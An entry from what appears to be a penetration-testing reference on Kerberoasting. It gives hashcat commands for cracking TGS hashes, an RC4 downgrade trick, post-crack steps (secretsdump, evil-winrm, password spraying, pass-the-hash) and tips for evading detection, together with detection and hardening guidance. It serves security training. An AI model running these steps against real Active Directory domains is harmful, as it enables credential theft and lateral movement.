name: Hashcat - Crack Kerberoast TGS
description: Cracks Kerberoast TGS-REP hashes offline. Mode 13100 for RC4-encrypted tickets (etype 23, faster), mode 19700 for AES256 (etype 18, much slower). Recovers the service account's plaintext password with no lockout or network activity.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== WHY OFFLINE CRACKING IS POWERFUL HERE ===
Once you have the TGS hash, cracking is purely local — no network traffic,
no lockout counter increments, no authentication events. You're brute-forcing
the service account's password against the ticket encryption, which is
equivalent to guessing the NT hash that encrypted it.

=== HASH MODES ===
  13100 = $krb5tgs$23$  — RC4 (ARCFOUR-HMAC-MD5, etype 23) — FAST
  19700 = $krb5tgs$18$  — AES256-CTS-HMAC-SHA1-96, etype 18 — SLOW
  Identify mode: look at the hash header:
    $krb5tgs$23$*user$domain$... → mode 13100
    $krb5tgs$18$*user$domain$... → mode 19700

=== CRACKING STRATEGY ===
1. Start with rockyou: hashcat -m 13100 hash.txt rockyou.txt
2. Add rules:          hashcat -m 13100 hash.txt rockyou.txt -r best64.rule
3. Corporate patterns: hashcat -m 13100 hash.txt -a 3 ?u?l?l?l?l?l?d?d
4. Larger wordlists:   hashcat -m 13100 hash.txt /opt/wordlists/weakpass_3a.txt

=== AES TICKETS — WHAT TO DO ===
AES tickets (mode 19700) are much slower. Options:
  1. If you have GenericWrite on the account, you can change its
     SupportedEncryptionTypes attribute to allow RC4 — then re-roast
  2. With Rubeus: /rc4opsec flag attempts RC4 downgrade request
  3. Just run it with GPU acceleration — still feasible for common passwords

=== AFTER CRACKING ===
  Verify:  crackmapexec smb <dc_ip> -u <svc_user> -p <cracked_pw>
  If DA:   Run secretsdump / evil-winrm immediately
  Spray:   Service accounts often reuse passwords across systems
  PTH:     Get NT hash via secretsdump then do pass-the-hash attacks Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).

=== KIRBI → HASHABLE FORMAT ===
If you have a .kirbi file (from Rubeus /export or mimikatz kerberos::list /export):
  python2.7 kirbi2john.py ticket.kirbi > ticket.john
  # May need sed to fix header for hashcat: s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/
  hashcat -m 13100 ticket.john /usr/share/wordlists/rockyou.txt

defense.why_it_works: Cracks captured TGS (Kerberos 5 etype 23) hashes offline with hashcat (-m 13100) or John to recover the service-account password.
defense.prerequisites: Captured TGS hashes and a wordlist; GPU recommended.
defense.impact: Plaintext service-account passwords - often privileged, enabling escalation/lateral movement.
defense.prevention: [MITRE T1110.002 M1027] Long, high-entropy service/user passwords make the offline crack infeasible; the hash is already stolen, so the victim cannot detect the cracking - password strength is the only defence. gMSA/100+ char service passwords make cracking infeasible.
defense.misconfiguration: Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).
defense.vulnerable_config:
# Service account set up manually with a weak password + SPN
# Attacker can find these with:
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet

# Bad state — password set 4 years ago, RC4 permitted:
# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433
# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable

# Confirming RC4 is available:
Get-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes
# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)
defense.secure_config:
# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,
# auto-rotated by AD, no human ever knows the password
New-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \
    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'
Install-ADServiceAccount gmsa_sql

# Fix 2 — For legacy accounts that must keep SPNs:
# Set a 100+ character random password (AD max is 127 chars):
$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)
Set-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)

# Fix 3 — Disable RC4, require AES-only:
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256
# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)
defense.evasion: Use /rc4opsec (skip AES-only accounts, request only downgradable tickets), roast a few high-value SPNs rather than all, and crack offline; avoid mass TGS requests that spike 4769.
